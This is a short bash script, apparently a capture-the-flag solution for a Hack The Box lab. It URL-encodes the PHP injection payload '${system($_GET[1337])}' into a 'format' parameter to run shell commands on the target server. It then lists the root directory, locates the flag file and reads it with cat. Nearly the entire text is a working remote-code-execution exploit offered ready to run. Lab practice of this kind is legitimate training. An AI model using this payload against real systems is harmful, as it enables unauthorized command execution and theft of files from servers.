# TARGET=localhost:1337
TARGET=206.189.24.162:31676

INJECT='${system($_GET[1337])}'
CMD='ls /'

# simple url encode parameters
encode() {
 python3 -c "import sys; from urllib.parse import quote; print(quote(sys.stdin.read()));"
}

flag_filename=$(curl -s "http://$TARGET/?format=$(echo $INJECT | encode)&1337=$(echo $CMD | encode)" | grep flag)
curl -s "http://$TARGET/?format=$(echo $INJECT | encode)&1337=$(echo cat /$flag_filename | encode)" | grep HTB
